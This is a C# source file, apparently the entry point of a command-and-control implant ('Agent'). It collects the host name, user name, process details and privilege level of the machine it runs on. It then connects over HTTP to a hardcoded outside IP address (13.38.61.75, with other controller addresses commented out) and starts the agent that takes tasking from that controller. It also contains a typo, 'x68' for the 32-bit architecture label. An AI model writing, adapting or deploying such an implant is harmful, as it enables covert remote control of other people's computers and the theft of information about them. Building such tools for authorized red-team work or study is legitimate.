﻿using Agent.Models;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Agent
{
    class Program
    {

        private static AgentMetadata s_metadata;
        private static CommModule s_commModule;

        private static CancellationTokenSource s_tokenSource = new CancellationTokenSource();

        static void Main(string[] args)
        {
            GenerateMetadata();

            s_commModule = new HttpCommModule("13.38.61.75", 80);
            //s_commModule = new HttpCommModule("192.168.56.102", 8080);
            //s_commModule = new HttpCommModule("15.188.8.236", 80);
            

            var agent = new Models.Agent(s_metadata, s_commModule);
            agent.Start();
        }

      

      

        static void GenerateMetadata()
        {
            var process = Process.GetCurrentProcess();
            var userName = Environment.UserName;

            string integrity = "Medium";
            if (userName == "SYSTEM")
                integrity = "SYSTEM";

            using(var identity = WindowsIdentity.GetCurrent())
            {
                if(identity.User != identity.Owner)
                {
                    integrity = "High";
                }
            }

            s_metadata = new AgentMetadata()
            {
                Id = Guid.NewGuid().ToString(),
                Hostname = Environment.MachineName,
                UserName = userName,
                ProcessId = process.Id,
                ProcessName = process.ProcessName,
                Architecture = Environment.Is64BitOperatingSystem ? "x64" : "x68",
                Integrity = integrity,
            };

        }
    }
}